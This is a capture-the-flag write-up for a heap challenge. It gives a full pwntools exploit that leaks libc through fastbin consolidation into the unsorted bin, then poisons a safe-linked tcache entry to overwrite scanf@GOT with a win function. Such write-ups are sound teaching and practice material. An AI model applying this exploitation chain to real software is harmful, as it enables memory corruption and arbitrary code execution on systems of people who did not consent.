---
title: "House of Rabbit - Unsorted Bin Leak and Safe-Linked Tcache Poisoning"
ctf: "heap"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-27"
lat: -199
lng: 702
summary: "Full exploit chain for House of Rabbit: fill tcache, force fastbin consolidation with a large malloc, leak libc from the resulting unsorted chunk, then poison a safe-linked tcache entry to overwrite `scanf@GOT` with `win()`."
tags:
  - "heap"
  - "tcache"
  - "unsortedbin"
  - "fastbin-consolidation"
  - "safe-linking"
  - "got-overwrite"
  - "glibc-2.39"
  - "house-of-rabbit"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_rabbit")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe
context.arch = "amd64"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r


def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

count = -1

def malloc(idx, size, data=None):
    global count
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.sendlineafter(b"size: ", str(size).encode())
    if data is not None:
        r.sendafter(b"data: ", data)
    else:
        r.sendafter(b"data: ", b"A" * size)
    r.recvuntil(b"done")
    count+=1
    return count

def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.recvuntil(b"done")


def edit(idx, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"idx: ", str(idx).encode())
    r.sendafter(b"data: ", data)
    r.recvuntil(b"done")


def show(idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"idx: ", str(idx).encode())
    return r.recvuntil(b"\n", drop=True)


def large_malloc():
    r.sendlineafter(b"> ", b"5")
    out = r.recvuntil(b"done")
    addr = int(out.split(b"at: ")[1].split(b"\n")[0], 16)
    return addr


def main():
    global r
    r = conn()
```

    
    This exploit combines two allocator behaviors:

    1. force adjacent fastbin chunks to consolidate into an unsorted-bin chunk,
       then leak libc from the freed chunk metadata.
    2. use a tcache overflow to poison a freed chunk's fd and make malloc
       return an arbitrary address.

    The large allocation is only a trigger. It is not the final target.
    
```python
    r.recvuntil(b"leak: ")
    heap = int(r.recvline(),16)
    r.recvuntil(b"addr: ")
    win = int(r.recvline(),16)

    entry_3 = []
    for i in range(7):
        entry_3.append(malloc(i,0x78))

    chunkA = malloc(7,0x78)
    chunkB = malloc(8,0x78)
    guard = malloc(9,0x10)

    for i in entry_3:
        free(i)

    free(chunkB)
    free(chunkA)
```

    At this point the 0x80 tcache bin is full, so the two extra frees land in
    fastbin instead.

    chunkA and chunkB are adjacent. The large malloc below forces
    malloc_consolidate(), glibc merges them into one unsorted-bin chunk, and
    the stale pointer in chunks[] lets us read the unsorted-bin fd as a libc
    leak.
    
```python
    large_malloc()

    lib = u64(show(chunkA)[8:15] + b"\x00") - 0x203c10
    log.success(f"LEAK:\nlibc:{hex(lib)}\nheap:{hex(heap)}\nwin:{hex(win)}\n")
    libc.address = lib
```
    
    now drain all chunks
    
```python
    for i in range(10,17):
        entry_3.append(malloc(i,0x78))

    padd   = malloc(17,0x78)
    chunkA = malloc(18,0x78)
    chunkB = malloc(19,0x78)
    guard  = malloc(20,0x10)
```
    
    Set up two freed chunks in tcache, then overflow the previous chunk to
    overwrite the protected fd pointer with scanf@GOT.

    The fd must be safe-linked, so we encode the target using the freed
    chunk's address.
    
```python
    free(chunkB)
    free(chunkA)

    edit(padd,b"A"*0x78 + p64(0x81)  + p64(protect_ptr(heap,0x404040)))

    malloc(21,0x78)
    malloc(22,0x78,p64(win))

    r.send(b"1")

    r.interactive()

if __name__ == "__main__":
    main()
```